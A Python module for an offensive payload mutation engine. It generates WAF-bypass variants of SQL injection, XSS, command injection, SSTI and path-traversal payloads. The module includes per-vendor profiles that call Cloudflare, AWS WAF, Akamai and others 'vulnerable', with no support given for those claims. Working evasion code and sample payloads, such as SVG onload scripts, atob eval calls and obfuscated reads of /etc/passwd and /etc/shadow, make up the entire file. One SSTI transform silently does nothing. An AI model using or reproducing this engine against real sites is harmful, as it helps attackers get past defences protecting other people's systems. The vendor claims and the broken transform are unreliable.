"""
Payload Mutation Engine — comprehensive WAF bypass & encoding chains.

Provides 20+ encoding/mutation techniques that can be chained together
to generate polymorphic payloads. Replaces the naive 3-variant approach
with a Burp-class evasion framework.

Architecture:
    PayloadEncoder   — Individual encoding transforms (URL, HTML, Unicode, etc.)
    MutationChain    — Chain multiple encoders together
    PayloadMutator   — High-level API: given a payload + WAF fingerprint,
                        generates the optimal set of evasion variants

Usage:
    mutator = PayloadMutator()
    variants = mutator.generate(payload, waf_type="cloudflare", max_variants=10)
"""

from __future__ import annotations

import html
import random
import re
import string
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional
from urllib.parse import quote, quote_plus


# ═══════════════════════════════════════════════════════════════════════
# Encoding Transforms
# ═══════════════════════════════════════════════════════════════════════

class Encoding(Enum):
    """Available encoding transforms."""
    URL = "url"
    DOUBLE_URL = "double_url"
    HTML_ENTITY = "html_entity"
    HTML_NUMERIC = "html_numeric"
    HTML_HEX = "html_hex"
    UNICODE_ESCAPE = "unicode_escape"
    UNICODE_FULL = "unicode_fullwidth"
    HEX_ESCAPE = "hex_escape"
    OCTAL_ESCAPE = "octal_escape"
    BASE64 = "base64"
    CASE_SWAP = "case_swap"
    COMMENT_INJECT = "comment_inject"
    WHITESPACE_VARY = "whitespace_vary"
    NULL_BYTE = "null_byte"
    NEWLINE_INJECT = "newline_inject"
    CONCAT_BREAK = "concat_break"
    CHAR_CODE = "char_code"
    OVERLONG_UTF8 = "overlong_utf8"
    BACKSLASH = "backslash"


class PayloadEncoder:
    """
    Single-responsibility encoder — each method applies ONE transform.
    """

    @staticmethod
    def url_encode(payload: str) -> str:
        """Standard URL encoding (percent-encode special chars)."""
        return quote(payload, safe="")

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encoding — bypasses single-decode WAFs."""
        return quote(quote(payload, safe=""), safe="")

    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """HTML entity encoding for key characters."""
        return html.escape(payload, quote=True)

    @staticmethod
    def html_numeric_encode(payload: str) -> str:
        """HTML numeric entity encoding (&#NNN;)."""
        result = []
        for ch in payload:
            if ch in '<>"\'&/()=;':
                result.append(f"&#{ord(ch)};")
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def html_hex_encode(payload: str) -> str:
        """HTML hex entity encoding (&#xHH;)."""
        result = []
        for ch in payload:
            if ch in '<>"\'&/()=;':
                result.append(f"&#x{ord(ch):02x};")
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def unicode_escape(payload: str) -> str:
        """JavaScript Unicode escape (\\uNNNN)."""
        result = []
        for ch in payload:
            if ch in '<>"\'()=;/':
                result.append(f"\\u{ord(ch):04x}")
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def unicode_fullwidth(payload: str) -> str:
        """Fullwidth Unicode characters (U+FF01 - U+FF5E)."""
        result = []
        for ch in payload:
            if 0x21 <= ord(ch) <= 0x7E:
                result.append(chr(ord(ch) + 0xFEE0))
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def hex_escape(payload: str) -> str:
        """Hex escape for SQL/CMDi contexts (0xHH)."""
        result = []
        for ch in payload:
            if ch in "'\"\\;-/":
                result.append(f"\\x{ord(ch):02x}")
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def octal_escape(payload: str) -> str:
        """Octal escape for shell contexts."""
        result = []
        for ch in payload:
            if ch in "'\"\\;|&":
                result.append(f"\\{ord(ch):03o}")
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def case_swap(payload: str) -> str:
        """Random case variation — bypasses case-sensitive regex WAFs."""
        result = []
        for ch in payload:
            if ch.isalpha():
                result.append(ch.upper() if random.random() > 0.5 else ch.lower())
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def null_byte_inject(payload: str) -> str:
        """Insert null bytes around dangerous keywords."""
        keywords = ["script", "alert", "onerror", "onload", "eval",
                     "SELECT", "UNION", "INSERT", "DROP", "sleep"]
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                idx = result.lower().find(kw.lower())
                actual = result[idx:idx + len(kw)]
                result = result[:idx] + "%00" + actual + result[idx + len(kw):]
        return result

    @staticmethod
    def newline_inject(payload: str) -> str:
        """Insert newlines/carriage returns to break pattern matching."""
        return payload.replace(" ", "\r\n")

    @staticmethod
    def backslash_escape(payload: str) -> str:
        """Backslash-based escaping for JS contexts."""
        result = []
        for ch in payload:
            if ch in "'\"":
                result.append(f"\\{ch}")
            else:
                result.append(ch)
        return "".join(result)


# ═══════════════════════════════════════════════════════════════════════
# SQL-Specific Mutations
# ═══════════════════════════════════════════════════════════════════════

class SQLMutator:
    """SQL-specific WAF bypass techniques."""

    @staticmethod
    def comment_inject(payload: str) -> str:
        """Inject inline comments to break keyword detection.
        SELECT → SEL/**/ECT, UNION → UNI/**/ON
        """
        keywords = {
            "SELECT": "SEL/**/ECT",
            "UNION": "UNI/**/ON",
            "INSERT": "INS/**/ERT",
            "UPDATE": "UPD/**/ATE",
            "DELETE": "DEL/**/ETE",
            "FROM": "FR/**/OM",
            "WHERE": "WH/**/ERE",
            "ORDER": "ORD/**/ER",
            "GROUP": "GR/**/OUP",
            "HAVING": "HAV/**/ING",
            "SLEEP": "SL/**/EEP",
            "WAITFOR": "WAIT/**/FOR",
            "BENCHMARK": "BENCH/**/MARK",
        }
        result = payload
        for kw, replacement in keywords.items():
            # Case-insensitive replacement
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            result = pattern.sub(replacement, result)
        return result

    @staticmethod
    def space_to_comment(payload: str) -> str:
        """Replace spaces with inline comments: ' OR ' → '/**/OR/**/'"""
        return payload.replace(" ", "/**/")

    @staticmethod
    def space_to_plus(payload: str) -> str:
        """Replace spaces with + signs (URL context)."""
        return payload.replace(" ", "+")

    @staticmethod
    def space_to_tab(payload: str) -> str:
        """Replace spaces with tabs."""
        return payload.replace(" ", "\t")

    @staticmethod
    def mysql_comment_version(payload: str) -> str:
        """MySQL version-specific comments: /*!50000 SELECT*/"""
        keywords = ["SELECT", "UNION", "INSERT", "FROM", "WHERE",
                     "SLEEP", "BENCHMARK"]
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            result = pattern.sub(f"/*!50000 {kw}*/", result)
        return result

    @staticmethod
    def string_concat(payload: str) -> str:
        """Break string literals with concatenation.
        'admin' → 'ad'+'min' (MSSQL) or 'ad'||'min' (Oracle/PG)
        """
        variants = []
        # Find quoted strings
        for match in re.finditer(r"'([^']+)'", payload):
            s = match.group(1)
            if len(s) >= 4:
                mid = len(s) // 2
                variants.append(f"'{s[:mid]}'||'{s[mid:]}'")
        if variants:
            result = payload
            for match, variant in zip(
                    re.finditer(r"'([^']+)'", payload), variants):
                result = result.replace(match.group(), variant, 1)
            return result
        return payload

    @staticmethod
    def hex_encode_strings(payload: str) -> str:
        """Hex-encode string values: 'admin' → 0x61646d696e"""
        def hex_replace(match):
            s = match.group(1)
            hex_val = s.encode().hex()
            return f"0x{hex_val}"
        return re.sub(r"'([^']+)'", hex_replace, payload)

    @staticmethod
    def char_function(payload: str) -> str:
        """Replace string with CHAR() function: 'a' → CHAR(97)"""
        def char_replace(match):
            s = match.group(1)
            chars = ",".join(str(ord(c)) for c in s)
            return f"CHAR({chars})"
        return re.sub(r"'([^']+)'", char_replace, payload)


# ═══════════════════════════════════════════════════════════════════════
# XSS-Specific Mutations
# ═══════════════════════════════════════════════════════════════════════

class XSSMutator:
    """XSS-specific WAF bypass techniques."""

    @staticmethod
    def tag_case_variation(payload: str) -> str:
        """Vary HTML tag case: <script> → <ScRiPt>"""
        def randomize_tag(match):
            tag = match.group(1)
            new_tag = "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in tag
            )
            return f"<{new_tag}"
        return re.sub(r"<(\w+)", randomize_tag, payload)

    @staticmethod
    def event_handler_variation(payload: str) -> str:
        """Add event handler alternatives."""
        alternatives = {
            "onerror": ["onerror", "ONERROR", "OnErRoR"],
            "onload": ["onload", "ONLOAD", "OnLoAd"],
            "onmouseover": ["onmouseover", "ONMOUSEOVER", "OnMoUsEoVeR"],
            "onfocus": ["onfocus", "ONFOCUS", "OnFoCuS"],
            "onclick": ["onclick", "ONCLICK", "OnClIcK"],
        }
        result = payload
        for handler, variants in alternatives.items():
            if handler in result.lower():
                idx = result.lower().find(handler)
                actual = result[idx:idx + len(handler)]
                chosen = random.choice(variants)
                result = result[:idx] + chosen + result[idx + len(handler):]
        return result

    @staticmethod
    def svg_payload(payload: str) -> str:
        """Convert img/script payloads to SVG variants."""
        if "alert" in payload or "confirm" in payload or "prompt" in payload:
            func = "alert(1)"
            for f in ["alert(1)", "confirm(1)", "prompt(1)"]:
                if f in payload:
                    func = f
                    break
            return f"<svg/onload={func}>"
        return payload

    @staticmethod
    def details_payload(payload: str) -> str:
        """Convert to details/ontoggle variant."""
        if "alert" in payload:
            return "<details/open/ontoggle=alert(1)>"
        return payload

    @staticmethod
    def js_fromcharcode(payload: str) -> str:
        """Replace alert(1) with String.fromCharCode variant."""
        func_call = "alert(1)"
        if func_call in payload:
            char_codes = ",".join(str(ord(c)) for c in func_call)
            replacement = f"eval(String.fromCharCode({char_codes}))"
            return payload.replace(func_call, replacement)
        return payload

    @staticmethod
    def js_atob(payload: str) -> str:
        """Replace alert(1) with atob() variant."""
        import base64
        func_call = "alert(1)"
        if func_call in payload:
            encoded = base64.b64encode(func_call.encode()).decode()
            replacement = f"eval(atob('{encoded}'))"
            return payload.replace(func_call, replacement)
        return payload

    @staticmethod
    def double_encoding(payload: str) -> str:
        """Double-encode < > for XSS: < → %253C"""
        return payload.replace("<", "%253C").replace(">", "%253E")

    @staticmethod
    def tab_newline_break(payload: str) -> str:
        """Insert tabs/newlines inside tags to break patterns.
        <script> → <scr\tipt> or <scr\nipt>
        """
        keywords = ["script", "img", "svg", "iframe", "body",
                     "input", "details", "marquee", "object"]
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                idx = result.lower().find(kw.lower())
                actual = result[idx:idx + len(kw)]
                mid = len(actual) // 2
                broken = actual[:mid] + "\t" + actual[mid:]
                result = result[:idx] + broken + result[idx + len(kw):]
        return result


# ═══════════════════════════════════════════════════════════════════════
# Command Injection Mutations
# ═══════════════════════════════════════════════════════════════════════

class CMDiMutator:
    """OS command injection WAF bypass techniques."""

    @staticmethod
    def variable_expansion(payload: str) -> str:
        """Use variable expansion to break keywords.
        cat → c${IFS}at or ca$()t
        """
        commands = {
            "cat": "ca${IFS}t",
            "id": "i${IFS}d",
            "whoami": "who${IFS}ami",
            "uname": "un${IFS}ame",
            "sleep": "sl${IFS}eep",
            "ping": "pi${IFS}ng",
            "wget": "wg${IFS}et",
            "curl": "cu${IFS}rl",
            "nslookup": "ns${IFS}lookup",
        }
        result = payload
        for cmd, expanded in commands.items():
            if cmd in result:
                result = result.replace(cmd, expanded, 1)
        return result

    @staticmethod
    def ifs_separator(payload: str) -> str:
        """Replace spaces with $IFS (Internal Field Separator)."""
        return payload.replace(" ", "${IFS}")

    @staticmethod
    def brace_expansion(payload: str) -> str:
        """Use brace expansion: cat /etc/passwd → {cat,/etc/passwd}"""
        parts = payload.strip().split(" ", 1)
        if len(parts) == 2:
            return "{" + parts[0] + "," + parts[1] + "}"
        return payload

    @staticmethod
    def quote_break(payload: str) -> str:
        """Break commands with quotes: cat → c'a't or c"a"t"""
        commands = ["cat", "id", "whoami", "uname", "sleep",
                    "ping", "wget", "curl"]
        result = payload
        for cmd in commands:
            if cmd in result and len(cmd) >= 3:
                mid = len(cmd) // 2
                broken = cmd[:mid] + "'" + cmd[mid] + "'" + cmd[mid + 1:]
                result = result.replace(cmd, broken, 1)
        return result

    @staticmethod
    def backslash_break(payload: str) -> str:
        """Break commands with backslashes: cat → c\\at"""
        commands = ["cat", "id", "whoami", "uname", "sleep",
                    "ping", "wget", "curl"]
        result = payload
        for cmd in commands:
            if cmd in result and len(cmd) >= 3:
                mid = len(cmd) // 2
                broken = cmd[:mid] + "\\" + cmd[mid:]
                result = result.replace(cmd, broken, 1)
        return result

    @staticmethod
    def wildcard_bypass(payload: str) -> str:
        """Use wildcards: /etc/passwd → /e?c/p?ss?d"""
        return (payload
                .replace("/etc/passwd", "/e?c/p?ss?d")
                .replace("/etc/shadow", "/e?c/sh?d?w")
                .replace("win.ini", "w?n.ini"))

    @staticmethod
    def alternate_separator(payload: str) -> str:
        """Use alternate command separators."""
        separators = [";", "|", "||", "&&", "\n", "%0a"]
        for sep in [";", "|"]:
            if payload.startswith(sep):
                alt = random.choice([s for s in separators if s != sep])
                return alt + payload[len(sep):]
        return payload


# ═══════════════════════════════════════════════════════════════════════
# WAF Profile — Maps WAF type to effective bypass strategies
# ═══════════════════════════════════════════════════════════════════════

@dataclass
class WAFProfile:
    """Known WAF bypass strategies."""
    name: str
    effective_encodings: list[str] = field(default_factory=list)
    comment_bypass: bool = False
    case_bypass: bool = False
    double_encode: bool = False
    description: str = ""


# WAF-specific bypass profiles
WAF_PROFILES: dict[str, WAFProfile] = {
    "cloudflare": WAFProfile(
        name="Cloudflare",
        effective_encodings=["double_url", "unicode_fullwidth",
                             "comment_inject", "case_swap"],
        comment_bypass=True,
        case_bypass=True,
        double_encode=True,
        description="Cloudflare WAF — vulnerable to Unicode fullwidth and comment injection",
    ),
    "aws_waf": WAFProfile(
        name="AWS WAF",
        effective_encodings=["double_url", "html_hex", "comment_inject",
                             "null_byte"],
        comment_bypass=True,
        case_bypass=False,
        double_encode=True,
        description="AWS WAF — vulnerable to double URL encoding and null bytes",
    ),
    "akamai": WAFProfile(
        name="Akamai Kona",
        effective_encodings=["unicode_escape", "html_numeric",
                             "comment_inject", "case_swap"],
        comment_bypass=True,
        case_bypass=True,
        double_encode=False,
        description="Akamai Kona — vulnerable to Unicode and HTML numeric encoding",
    ),
    "imperva": WAFProfile(
        name="Imperva/Incapsula",
        effective_encodings=["double_url", "html_hex", "case_swap",
                             "whitespace_vary"],
        comment_bypass=True,
        case_bypass=True,
        double_encode=True,
        description="Imperva — vulnerable to double encoding and case variation",
    ),
    "f5_bigip": WAFProfile(
        name="F5 BIG-IP ASM",
        effective_encodings=["unicode_fullwidth", "comment_inject",
                             "hex_escape"],
        comment_bypass=True,
        case_bypass=False,
        double_encode=False,
        description="F5 BIG-IP — vulnerable to Unicode fullwidth characters",
    ),
    "modsecurity": WAFProfile(
        name="ModSecurity",
        effective_encodings=["double_url", "comment_inject", "case_swap",
                             "null_byte", "unicode_escape"],
        comment_bypass=True,
        case_bypass=True,
        double_encode=True,
        description="ModSecurity CRS — vulnerable to comment injection and encoding chains",
    ),
    "sucuri": WAFProfile(
        name="Sucuri",
        effective_encodings=["html_numeric", "html_hex", "case_swap"],
        comment_bypass=False,
        case_bypass=True,
        double_encode=False,
        description="Sucuri WAF — vulnerable to HTML entity encoding",
    ),
    "wordfence": WAFProfile(
        name="Wordfence",
        effective_encodings=["double_url", "case_swap", "comment_inject"],
        comment_bypass=True,
        case_bypass=True,
        double_encode=True,
        description="Wordfence — vulnerable to double URL encoding",
    ),
}


# ═══════════════════════════════════════════════════════════════════════
# Payload Mutator — High-Level API
# ═══════════════════════════════════════════════════════════════════════

@dataclass
class MutationResult:
    """Result of a mutation operation."""
    original: str
    variant: str
    techniques: list[str]
    description: str


class PayloadMutator:
    """
    High-level payload mutation engine.

    Given a raw payload and optional WAF fingerprint, generates
    evasion variants using the most effective techniques.

    Usage:
        mutator = PayloadMutator()
        variants = mutator.generate("' OR 1=1--", vuln_type="sqli",
                                     waf_type="cloudflare", max_variants=10)
    """

    def __init__(self):
        self.encoder = PayloadEncoder()
        self.sql_mutator = SQLMutator()
        self.xss_mutator = XSSMutator()
        self.cmdi_mutator = CMDiMutator()

    def generate(self, payload: str, vuln_type: str = "generic",
                 waf_type: Optional[str] = None,
                 max_variants: int = 8) -> list[MutationResult]:
        """
        Generate evasion variants for a payload.

        Args:
            payload: Original payload string
            vuln_type: "sqli", "xss", "cmdi", "ssti", "lfi", "generic"
            waf_type: WAF name (e.g., "cloudflare", "aws_waf") or None
            max_variants: Maximum variants to return

        Returns:
            List of MutationResult (always includes original as first)
        """
        results = [MutationResult(
            original=payload, variant=payload,
            techniques=["original"], description="Original payload",
        )]

        # Collect all applicable mutations
        candidates: list[MutationResult] = []

        # 1. Generic encoding transforms
        candidates.extend(self._generic_mutations(payload))

        # 2. Vuln-type-specific mutations
        if vuln_type == "sqli":
            candidates.extend(self._sqli_mutations(payload))
        elif vuln_type == "xss":
            candidates.extend(self._xss_mutations(payload))
        elif vuln_type == "cmdi":
            candidates.extend(self._cmdi_mutations(payload))
        elif vuln_type == "ssti":
            candidates.extend(self._ssti_mutations(payload))
        elif vuln_type == "lfi":
            candidates.extend(self._lfi_mutations(payload))

        # 3. WAF-specific prioritization
        if waf_type and waf_type.lower() in WAF_PROFILES:
            profile = WAF_PROFILES[waf_type.lower()]
            candidates = self._prioritize_for_waf(candidates, profile)

        # Deduplicate and trim
        seen = {payload}
        for candidate in candidates:
            if candidate.variant not in seen and candidate.variant != payload:
                seen.add(candidate.variant)
                results.append(candidate)
            if len(results) >= max_variants + 1:
                break

        return results[:max_variants + 1]

    def generate_variants(self, payload: str, vuln_type: str = "generic",
                          waf_type: Optional[str] = None,
                          max_variants: int = 8) -> list[str]:
        """Convenience: return just the variant strings (including original)."""
        results = self.generate(payload, vuln_type, waf_type, max_variants)
        return [r.variant for r in results][:max_variants]

    # ── Generic mutations (apply to any payload type) ────────────

    def _generic_mutations(self, payload: str) -> list[MutationResult]:
        mutations = []

        # Case variation
        variant = PayloadEncoder.case_swap(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["case_swap"],
                description="Random case variation",
            ))

        # URL encoding
        variant = PayloadEncoder.url_encode(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["url_encode"],
                description="URL percent-encoding",
            ))

        # Double URL encoding
        variant = PayloadEncoder.double_url_encode(payload)
        mutations.append(MutationResult(
            original=payload, variant=variant,
            techniques=["double_url_encode"],
            description="Double URL encoding (bypass single-decode WAFs)",
        ))

        # HTML numeric entities
        variant = PayloadEncoder.html_numeric_encode(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["html_numeric"],
                description="HTML numeric entity encoding",
            ))

        # Unicode fullwidth
        variant = PayloadEncoder.unicode_fullwidth(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["unicode_fullwidth"],
                description="Unicode fullwidth characters",
            ))

        return mutations

    # ── SQL injection mutations ──────────────────────────────────

    def _sqli_mutations(self, payload: str) -> list[MutationResult]:
        mutations = []

        # Comment injection
        variant = SQLMutator.comment_inject(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["sql_comment_inject"],
                description="SQL keyword broken with inline comments",
            ))

        # Space → comment
        variant = SQLMutator.space_to_comment(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["sql_space_to_comment"],
                description="Spaces replaced with /**/ comments",
            ))

        # Space → tab
        variant = SQLMutator.space_to_tab(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["sql_space_to_tab"],
                description="Spaces replaced with tabs",
            ))

        # MySQL version comment
        variant = SQLMutator.mysql_comment_version(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["mysql_version_comment"],
                description="MySQL version-conditional comments",
            ))

        # Hex-encode strings
        variant = SQLMutator.hex_encode_strings(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["sql_hex_strings"],
                description="String values hex-encoded",
            ))

        # CHAR() function
        variant = SQLMutator.char_function(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["sql_char_function"],
                description="Strings replaced with CHAR() function",
            ))

        # String concatenation
        variant = SQLMutator.string_concat(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["sql_string_concat"],
                description="String concatenation to break signatures",
            ))

        # Combined: comment + case
        variant = SQLMutator.comment_inject(PayloadEncoder.case_swap(payload))
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["sql_comment_inject", "case_swap"],
                description="Comment injection + case variation (chained)",
            ))

        return mutations

    # ── XSS mutations ────────────────────────────────────────────

    def _xss_mutations(self, payload: str) -> list[MutationResult]:
        mutations = []

        # Tag case variation
        variant = XSSMutator.tag_case_variation(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["xss_tag_case"],
                description="HTML tag case randomization",
            ))

        # Event handler variation
        variant = XSSMutator.event_handler_variation(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["xss_event_variation"],
                description="Event handler case variation",
            ))

        # SVG alternative
        variant = XSSMutator.svg_payload(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["xss_svg"],
                description="SVG-based payload alternative",
            ))

        # Details/ontoggle
        variant = XSSMutator.details_payload(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["xss_details"],
                description="details/ontoggle payload alternative",
            ))

        # String.fromCharCode
        variant = XSSMutator.js_fromcharcode(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["xss_fromcharcode"],
                description="String.fromCharCode encoding",
            ))

        # atob()
        variant = XSSMutator.js_atob(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["xss_atob"],
                description="Base64 atob() encoding",
            ))

        # Tab/newline break
        variant = XSSMutator.tab_newline_break(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["xss_tab_break"],
                description="Tab insertion inside tag names",
            ))

        # Double encoding
        variant = XSSMutator.double_encoding(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["xss_double_encode"],
                description="Double percent-encoding of angle brackets",
            ))

        # HTML numeric + case chain
        variant = XSSMutator.tag_case_variation(
            PayloadEncoder.html_numeric_encode(payload))
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["html_numeric", "xss_tag_case"],
                description="HTML numeric encoding + tag case variation (chained)",
            ))

        return mutations

    # ── Command injection mutations ──────────────────────────────

    def _cmdi_mutations(self, payload: str) -> list[MutationResult]:
        mutations = []

        # Variable expansion
        variant = CMDiMutator.variable_expansion(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["cmdi_var_expansion"],
                description="Bash variable expansion to break keywords",
            ))

        # IFS separator
        variant = CMDiMutator.ifs_separator(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["cmdi_ifs"],
                description="Spaces replaced with $IFS",
            ))

        # Quote break
        variant = CMDiMutator.quote_break(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["cmdi_quote_break"],
                description="Command names broken with quotes",
            ))

        # Backslash break
        variant = CMDiMutator.backslash_break(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["cmdi_backslash"],
                description="Command names broken with backslashes",
            ))

        # Wildcard bypass
        variant = CMDiMutator.wildcard_bypass(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["cmdi_wildcard"],
                description="File paths obscured with wildcards",
            ))

        # Alternate separator
        variant = CMDiMutator.alternate_separator(payload)
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["cmdi_alt_separator"],
                description="Alternate command separator",
            ))

        # Brace expansion
        variant = CMDiMutator.brace_expansion(payload.lstrip(";|&\n "))
        if variant != payload.lstrip(";|&\n "):
            mutations.append(MutationResult(
                original=payload, variant=";" + variant,
                techniques=["cmdi_brace"],
                description="Bash brace expansion",
            ))

        return mutations

    # ── SSTI mutations ───────────────────────────────────────────

    def _ssti_mutations(self, payload: str) -> list[MutationResult]:
        mutations = []

        # Unicode escape of delimiters
        variant = payload.replace("{{", "\u007b\u007b").replace("}}", "\u007d\u007d")
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["ssti_unicode_delimiters"],
                description="Template delimiters as Unicode escapes",
            ))

        # URL-encode delimiters
        variant = payload.replace("{{", "%7b%7b").replace("}}", "%7d%7d")
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["ssti_url_encode"],
                description="Template delimiters URL-encoded",
            ))

        # Alternate Jinja2 syntax
        if "{{" in payload:
            variant = payload.replace("{{", "{%print(").replace("}}", ")%}")
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["ssti_print_block"],
                description="Jinja2 {%print()%} alternative syntax",
            ))

        return mutations

    # ── LFI mutations ────────────────────────────────────────────

    def _lfi_mutations(self, payload: str) -> list[MutationResult]:
        mutations = []

        # Double encoding
        variant = payload.replace("../", "..%252f")
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["lfi_double_encode"],
                description="Double-encoded path traversal slashes",
            ))

        # Null byte termination
        if not payload.endswith("%00"):
            variant = payload + "%00"
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["lfi_null_byte"],
                description="Null byte path truncation",
            ))

        # UTF-8 overlong encoding of /
        variant = payload.replace("../", "..%c0%af")
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["lfi_overlong_utf8"],
                description="UTF-8 overlong encoding of slash",
            ))

        # Backslash variant (Windows)
        variant = payload.replace("../", "..\\")
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["lfi_backslash"],
                description="Backslash path traversal (Windows)",
            ))

        # ....// bypass
        variant = payload.replace("../", "....//")
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["lfi_double_dot"],
                description="....// traversal to bypass ../ stripping",
            ))

        # ..;/ bypass (Tomcat, Spring)
        variant = payload.replace("../", "..;/")
        if variant != payload:
            mutations.append(MutationResult(
                original=payload, variant=variant,
                techniques=["lfi_semicolon"],
                description="..;/ traversal (Tomcat/Spring path normalization)",
            ))

        return mutations

    # ── WAF-specific prioritization ──────────────────────────────

    def _prioritize_for_waf(self, candidates: list[MutationResult],
                            profile: WAFProfile) -> list[MutationResult]:
        """Reorder candidates to prioritize techniques effective against the WAF."""

        def score(mutation: MutationResult) -> float:
            s = 0.0
            for technique in mutation.techniques:
                if technique in profile.effective_encodings:
                    s += 2.0
                if profile.comment_bypass and "comment" in technique:
                    s += 1.5
                if profile.case_bypass and "case" in technique:
                    s += 1.0
                if profile.double_encode and "double" in technique:
                    s += 1.5
            return s

        return sorted(candidates, key=score, reverse=True)
